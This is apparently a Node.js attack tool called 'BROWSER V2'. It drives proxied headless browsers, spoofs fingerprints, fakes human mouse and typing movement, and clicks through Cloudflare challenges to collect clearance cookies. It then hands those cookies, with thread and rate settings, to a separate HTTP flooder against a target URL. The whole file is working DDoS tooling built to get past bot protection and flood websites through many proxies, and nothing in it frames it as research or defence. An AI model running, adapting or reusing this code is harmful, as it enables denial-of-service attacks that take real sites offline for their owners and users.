const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const {exec} = require('child_process');
const {spawn} = require("child_process");
const chalk = require('chalk');
const errorHandler = error => console.log(error);
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function(item) {
    const index = this.indexOf(item);
    if (index !== -1) this.splice(index, 1);
    return item
};
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}
const rd = generateRandomNumber(100, 135);
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`
  ];
  const userAgent = randomElement(userAgents);
  const nmcutii = {
  COLOR_RED: "\x1b[31m",
  COLOR_GREEN: "\x1b[32m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_RESET: "\x1b[0m",
  COLOR_PURPLE: "\x1b[35m",
  COLOR_CYAN: "\x1b[36m",
  COLOR_BLUE: "\x1b[34m",
  COLOR_BRIGHT_RED: "\x1b[91m",
  COLOR_BRIGHT_GREEN: "\x1b[92m",
  COLOR_BRIGHT_YELLOW: "\x1b[93m",
  COLOR_BRIGHT_BLUE: "\x1b[94m",
  COLOR_BRIGHT_PURPLE: "\x1b[95m",
  COLOR_BRIGHT_CYAN: "\x1b[96m",
  COLOR_BRIGHT_WHITE: "\x1b[97m",
  BOLD: "\x1b[1m",
  ITALIC: "\x1b[3m"
};
  function colored(colorCode, text) {
      console.log(colorCode + text + nmcutii.COLOR_RESET);
  }
function nmwaitpage() {
    const min = 7000;
    const max = 14000;
    const randomTime = Math.floor(Math.random() * (max - min + 1)) + min;
    return new Promise(resolve => setTimeout(resolve, randomTime));
  }
async function simulateHumanMouseMovement(page, element, options = {}) {
    const {minMoves = 5, maxMoves = 10, minDelay = 50, maxDelay = 150, jitterFactor = 0.1, overshootChance = 0.2, hesitationChance = 0.1, finalDelay = 500} = options;
    const bbox = await element.boundingBox();
    if (!bbox) throw new Error('Element not visible');
    const targetX = bbox.x + bbox.width / 2;
    const targetY = bbox.y + bbox.height / 2;
    const pageDimensions = await page.evaluate(() => ({width: window.innerWidth, height: window.innerHeight}));
    let currentX = Math.random() * pageDimensions.width;
    let currentY = Math.random() * pageDimensions.height;
    const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;
    for (let i = 0; i < moves; i++) {
        const progress = i / (moves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;
        nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;
        if (Math.random() < overshootChance && i < moves - 1) {
            nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
            nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY)
        }
        await page.mouse.move(nextX, nextY, {steps: 10});
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < hesitationChance) await new Promise(resolve => setTimeout(resolve, delay * 3));
        currentX = nextX;
        currentY = nextY
    }
    await page.mouse.move(targetX, targetY, {steps: 5});
    await new Promise(resolve => setTimeout(resolve, finalDelay))
}
async function simulateHumanTyping(page, element, text, options = {}) {
    const {minDelay = 30, maxDelay = 100, mistakeChance = 0.05, pauseChance = 0.02} = options;
    await simulateHumanMouseMovement(page, element);
    await element.click();
    await element.evaluate(el => el.value = '');
    for (let i = 0; i < text.length; i++) {
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < mistakeChance) {
            const randomChar = String.fromCharCode(97 + Math.floor(Math.random() * 26));
            await page.keyboard.press(randomChar);
            await new Promise(resolve => setTimeout(resolve, delay * 2));
            await page.keyboard.press('Backspace');
            await new Promise(resolve => setTimeout(resolve, delay))
        }
        await page.keyboard.press(text[i]);
        if (Math.random() < pauseChance) await new Promise(resolve => setTimeout(resolve, delay * 10))
    }
}
async function simulateHumanScrolling(page, distance, options = {}) {
    const {minSteps = 5, maxSteps = 15, minDelay = 50, maxDelay = 200, direction = 'down', pauseChance = 0.2, jitterFactor = 0.1} = options;
    const directionMultiplier = direction === 'up' ? -1 : 1;
    const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
    const baseStepSize = distance / steps;
    let totalScrolled = 0;
    for (let i = 0; i < steps; i++) {
        const jitter = baseStepSize * jitterFactor * (Math.random() * 2 - 1);
        let stepSize = Math.round(baseStepSize + jitter);
        if (i === steps - 1) stepSize = (distance - totalScrolled) * directionMultiplier;
        else stepSize = stepSize * directionMultiplier;
        await page.evaluate(scrollAmount => {window.scrollBy(0, scrollAmount)}, stepSize);
        totalScrolled += stepSize * directionMultiplier;
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < pauseChance) await new Promise(resolve => setTimeout(resolve, delay * 6))
    }
}
async function simulateNaturalPageBehavior(page) {
    const dimensions = await page.evaluate(() => ({width: document.documentElement.clientWidth, height: document.documentElement.clientHeight, scrollHeight: document.documentElement.scrollHeight}));
    const scrollAmount = Math.floor(dimensions.scrollHeight * (0.2 + Math.random() * 0.6));
    await simulateHumanScrolling(page, scrollAmount, {minSteps: 8, maxSteps: 15, pauseChance: 0.3});
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 3000));
    const movementCount = 2 + Math.floor(Math.random() * 4);
    for (let i = 0; i < movementCount; i++) {
        const x = Math.floor(Math.random() * dimensions.width * 0.8) + dimensions.width * 0.1;
        const y = Math.floor(Math.random() * dimensions.height * 0.8) + dimensions.height * 0.1;
        await page.mouse.move(x, y, {steps: 10 + Math.floor(Math.random() * 20)});
        await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000))
    }
    if (Math.random() > 0.5) await simulateHumanScrolling(page, scrollAmount / 2, {direction: 'up', minSteps: 3, maxSteps: 8})
}
async function spoofFingerprint(page) {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(window, 'screen', {value: {width: 1920, height: 1080, availWidth: 1920, availHeight: 1080, colorDepth: 64, pixelDepth: 64}});
        Object.defineProperty(navigator, 'userAgent', {value: userAgent});
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const originalGetParameter = gl.getParameter;
            gl.getParameter = function(parameter) {
                if (parameter === gl.VENDOR) return 'WebKit';
                else if (parameter === gl.RENDERER) return 'Apple GPU';
                else return originalGetParameter.call(this, parameter)
            }
        }
        Object.defineProperty(navigator, 'plugins', {value: [{name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1}]});
        Object.defineProperty(navigator, 'languages', {value: ['en-US', 'en']});
        Object.defineProperty(navigator, 'webdriver', {get: () => false});
        Object.defineProperty(navigator, 'hardwareConcurrency', {value: 4});
        Object.defineProperty(navigator, 'deviceMemory', {value: 8});
        Object.defineProperty(document, 'cookie', {configurable: true, enumerable: true, get: function() {return ''}, set: function() {}});
        Object.defineProperty(navigator, 'cookiesEnabled', {configurable: true, enumerable: true, get: function() {return true}, set: function() {}});
        Object.defineProperty(window, 'localStorage', {configurable: true, enumerable: true, value: {getItem: function() {return null}, setItem: function() {}, removeItem: function() {}}});
        Object.defineProperty(navigator, 'doNotTrack', {value: null});
        Object.defineProperty(navigator, 'maxTouchPoints', {value: 10});
        Object.defineProperty(navigator, 'language', {value: 'en-US'});
        Object.defineProperty(navigator, 'vendorSub', {value: ''})
    })
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
if (process.argv.length < 8) {
  console.clear();
console.log(`
  ${chalk.cyanBright('BROWSER V2')} | Updated: May 6, 2025
    
    ${chalk.blueBright('Usage:')}
      ${chalk.redBright(`node ${process.argv[1]} <target> <duration> <threads browser> <threads flood> <rates> <proxy>`)}
      ${chalk.yellowBright(`Example: node ${process.argv[1]} https://captcha.nminhniee.sbs 400 5 2 30 proxy.txt`)}
`);
process.exit(1);
};

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];
const urlObj = new URL(targetURL);
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
if (!/^https?:\/\//i.test(targetURL)) {
    console.error('URL must start with http:// or https://');
    process.exit(1);
};
const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/);
        return proxies;
    } catch (error) {
        console.error('Error reading proxies file:', error);
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);



async function solvingCaptcha(browser, page, browserProxy) {
    async function findElement(parent, selectors, timeout = 10000, retryInterval = 1000) {
        const startTime = Date.now();
        while (Date.now() - startTime < timeout) {
            for (const selector of selectors) {
                let elementHandle = null;
                try {
                    if (parent.elementHandle) {
                        elementHandle = await parent.elementHandle.evaluateHandle((el, sel) => {
                            return el.querySelector(sel) || el.shadowRoot?.querySelector(sel);
                        }, selector);
                    } else {
                        elementHandle = await parent.$(selector);
                    }
                    if (elementHandle && await elementHandle.evaluate(el => el.isConnected && (el instanceof HTMLElement))) {
                        return elementHandle;
                    }
                    if (elementHandle) await elementHandle.dispose();
                } catch (err) {}
                await new Promise(resolve => setTimeout(resolve, retryInterval));
            }
        }
        return null;
    }

    async function isClickable(element) {
        try {
            return await element.evaluate(el => {
                if (!(el instanceof HTMLElement)) return false;
                const style = window.getComputedStyle(el);
                return style.display !== 'none' && style.visibility !== 'hidden' && style.pointerEvents !== 'none' && el.offsetParent !== null;
            });
        } catch {
            return false;
        }
    }

    async function fastClick(element, times = 5, delay = 50) {
        for (let i = 0; i < times; i++) {
            for (let attempt = 0; attempt < 3; attempt++) {
                try {
                    if (await element.evaluate(el => el.isConnected) && await isClickable(element)) {
                        await element.click();
                        await new Promise(resolve => setTimeout(resolve, delay));
                        break;
                    }
                    await element.evaluate(el => {
                        if (el instanceof HTMLElement) el.click();
                    });
                    await new Promise(resolve => setTimeout(resolve, delay));
                    break;
                } catch (err) {
                    if (attempt === 2) throw new Error(`Click failed: ${err.message}`);
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }
        }
    }

    try {
        const content = await page.content();
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            colored(nmcutii.COLOR_YELLOW, `[INFO] Cloudflare challenge detected`);
            colored(nmcutii.COLOR_YELLOW, `[INFO] Proxy: ${browserProxy} - Attempting to solve challenge...`);
            await nmwaitpage();
            for (let attempt = 1; attempt <= 2; attempt++) {
                try {
                    const divSelectors = [
                        'body > div.main-wrapper > div > div > div > div',
                        'div.main-wrapper',
                        'div[class*="challenge"]',
                        'div[role="dialog"]',
                        'div.cf-turnstile'
                    ];
                    const captchaDiv = await findElement(page, divSelectors, 5000);
                    if (captchaDiv) {
                        colored(nmcutii.COLOR_BRIGHT_BLUE, "[DEBUG] Found captcha div with proxy: " + browserProxy);
                        await fastClick(captchaDiv, 5, 50);
                    }
                    const captchaSelectors = [
                        "[name='cf-turnstile-response']",
                        "#custom-turnstile",
                        "div.custom-turnstile",
                        "input[name='custom-turnstile-response']"
                    ];
                    const customCaptcha = await findElement(page, captchaSelectors, 5000);
                    if (customCaptcha) {
                        colored(nmcutii.COLOR_BRIGHT_BLUE, "[DEBUG] Found custom turnstile with proxy: " + browserProxy);
                        await fastClick(customCaptcha, 5, 50);
                    }
                    const iframeSelectors = [
                        "iframe",
                        "div > iframe",
                        "iframe.cf-challenge",
                        "iframe[title*='challenge']",
                        ".cf-iframe"
                    ];
                    const challengeIframe = await findElement(page, iframeSelectors, 5000);
                    if (!challengeIframe) {
                        continue;
                    }
                    let iframeElement = null;
                    for (let i = 0; i < 3; i++) {
                        iframeElement = await challengeIframe.contentFrame();
                        if (iframeElement) break;
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                    if (!iframeElement) {
                        colored(nmcutii.COLOR_RED, "[ERROR] Cannot access iframe");
                        continue;
                    }
                    const buttonSelectors = [
                        "input",
                        "[name='cf-turnstile-response']",
                        "button",
                        ".turnstile-button",
                        "#turnstile-button",
                        "div > input",
                        "div > button",
                        "button.turnstile__button",
                        "input.turnstile__input",
                        "[data-action='solve-turnstile']"
                    ];
                    const challengeButton = await findElement(iframeElement, buttonSelectors, 5000);
                    if (!challengeButton) {
                        continue;
                    }
                    await fastClick(challengeButton, 5, 50);
                    colored(nmcutii.COLOR_BRIGHT_BLUE, "[DEBUG] Challenge button clicked");
                    const newContent = await page.content();
                    if (newContent.includes("cloudflare.challenges.com") || newContent.includes("challenge-platform")) {
                        colored(nmcutii.COLOR_BRIGHT_BLUE, `[DEBUG] Challenge not resolved, retry ${attempt}/2 with proxy: ${browserProxy}`);
                        continue;
                    }
                    colored(nmcutii.COLOR_BRIGHT_BLUE, "[DEBUG] Challenge resolved with proxy: " + browserProxy);
                    return true;
                } catch (err) {
                    if (err.message.includes("detached") || err.message.includes("Click failed")) {
                        colored(nmcutii.COLOR_YELLOW, `[DEBUG] Node issue, retrying attempt ${attempt}/2 with proxy: ${browserProxy}`);
                        continue;
                    }
                    throw err;
                }
            }
            return false;
        }
        colored(nmcutii.COLOR_BRIGHT_BLUE, "[DEBUG] No Cloudflare challenge detected");
        return true;
    } catch (error) {
        colored(nmcutii.COLOR_RED, `[ERROR] ${error}`);
        return false;
    }
}

async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxRetries = 2) {
    let browser;
    const options = {
        headless: true,
        args: [
            `--proxy-server=${browserProxy}`,
            `--user-agent=${userAgent}`,
            '--headless=new',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--no-zygote',
            '--window-size=360,640',
            '--disable-gpu',
            '--disable-accelerated-2d-canvas',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-back-forward-cache',
            '--disable-browser-side-navigation',
            '--disable-renderer-backgrounding',
            '--disable-ipc-flooding-protection',
            '--metrics-recording-only',
            '--disable-extensions',
            '--disable-default-apps',
            '--disable-application-cache',
            '--disable-component-extensions-with-background-pages',
            '--disable-client-side-phishing-detection',
            '--disable-popup-blocking',
            '--disable-prompt-on-repost',
            '--disable-infobars',
            '--disable-breakpad',
            '--disable-field-trial-config',
            '--disable-background-networking',
            '--disable-search-engine-choice-screen',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--tls-min-version=1.2',
            '--tls-max-version=1.3',
            '--ssl-version-min=tls1.2',
            '--ssl-version-max=tls1.3',
            '--enable-quic',
            '--enable-features=PostQuantumKyber',
            '--disable-blink-features=AutomationControlled',
            '--no-first-run',
            '--test-type',
            '--allow-pre-commit-input',
            '--force-color-profile=srgb',
            '--use-mock-keychain',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure,IsolateOrigins,site-per-process'
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 3,
            isMobile: true,
            hasTouch: Math.random() < 0.5,
            isLandscape: false
        }
    };

    try {
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        const client = page._client();
        await spoofFingerprint(page);

        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id }).catch(() => {});
            }
        });

        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded" });
        await simulateNaturalPageBehavior(page);

        await solvingCaptcha(browser, page, browserProxy);
        const title = await page.title();
        const cookies = await page.cookies(targetURL);
        if (!cookies || !cookies.some(cookie => cookie.name === 'cf_clearance' && cookie.value.trim().length > 10)) {
            colored(nmcutii.COLOR_RED, "[ERROR] Failed to solve challenge with proxy: " + browserProxy);
            return;
        }
        const cookieString = cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim();
        await browser.close();
        return {
            title: title,
            browserProxy: browserProxy,
            cookies: cookieString,
            userAgent: userAgent
        };
    } catch (error) {
        if (browser) {
            await browser.close().catch(() => {});
        }
    }
}
let cookieCount = 0;
async function startthread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === 1) {
       
        const currentTask = queue.length();
        done(null, { task, currentTask });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
         if (response) {
                if (response.title === "Attention Required! | Cloudflare") {
                	 colored(nmcutii.COLOR_RED, "[INFO] Blocked by Cloudflare. Exiting.")
                return;
            }
            if (!response.cookies) {
                colored(nmcutii.COLOR_RED, `[ERROR] No cookies with proxy: ${browserProxy}`);
                return;
            } 
            cookieCount++;
            const cookies = `[INFO] Total solve: ${cookieCount}\n[INFO] Title: ${response.title}\n[INFO] Proxy: ${browserProxy}\n[INFO] Cookies: ${response.cookies}\n[INFO] Useragent: ${response.userAgent}`;
            colored(nmcutii.COLOR_GREEN, cookies);
            
            try {
                spawn("node", [
                    "g.js",
                    targetURL,
                    duration, 
                    thread,
                    response.browserProxy,
                    rates,
                    response.cookies,
                    response.userAgent
                ]);
            } catch (error) {
                colored(nmcutii.COLOR_RED, "[INFO] Error spawning g.js: " + error.message);
            }
            
            done(null, { task });
        } else {
            await startthread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        console.log(`[ERROR] Error in startthread for proxy ${browserProxy}: ${error.message}`);
        await startthread(targetURL, browserProxy, task, done, retries + 1);
    }
}
const queue = async.queue(function(task, done) {
    startthread(targetURL, task.browserProxy, task, done)
}, threads);
queue.drain(function() {
    colored(nmcutii.COLOR_RED, "[INFO] All proxies processed")
    process.exit(1)
});

async function main() {
    if (proxies.length === 0) {
        colored(nmcutii.COLOR_RED, "[ERROR] No proxies found in file. Exiting.");
        process.exit(1)
    }
    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({browserProxy: browserProxy})
    }
    setTimeout(() => {
        colored(nmcutii.COLOR_YELLOW, "[INFO] Time's up! Cleaning up...");
        queue.kill();
        exec('pkill -f g.js', (err) => {
            if (err && err.code !== 1) {
                
            } else {
                colored(nmcutii.COLOR_GREEN, "[INFO] Successfully killed g.js processes")
            }
        });
        exec('pkill -f chrome', (err) => {
            if (err && err.code !== 1) {
                
            } else {
                colored(nmcutii.COLOR_GREEN, "[INFO] Successfully killed Chrome processes")
            }
        });
        setTimeout(() => {
            colored(nmcutii.COLOR_GREEN, "[INFO] Exiting");
            process.exit(0)
        }, 5000)
    }, duration * 1000)
}
console.clear();
colored(nmcutii.COLOR_GREEN, "[INFO] Running...");
colored(nmcutii.COLOR_GREEN, `[INFO] Target: ${targetURL}`)
colored(nmcutii.COLOR_GREEN, `[INFO] Duration: ${duration} seconds`)
colored(nmcutii.COLOR_GREEN, `[INFO] Threads Browser: ${threads}`)
colored(nmcutii.COLOR_GREEN, `[INFO] Threads Flooder: ${thread}`)
colored(nmcutii.COLOR_GREEN, `[INFO] Rates Flooder: ${rates}`)
colored(nmcutii.COLOR_GREEN, `[INFO] Proxies: ${proxies.length} | Filename: ${proxyFile}`)
main().catch(err => {
    colored(nmcutii.COLOR_RED, "[ERROR] Main function error: " + err.message);
    process.exit(1)
});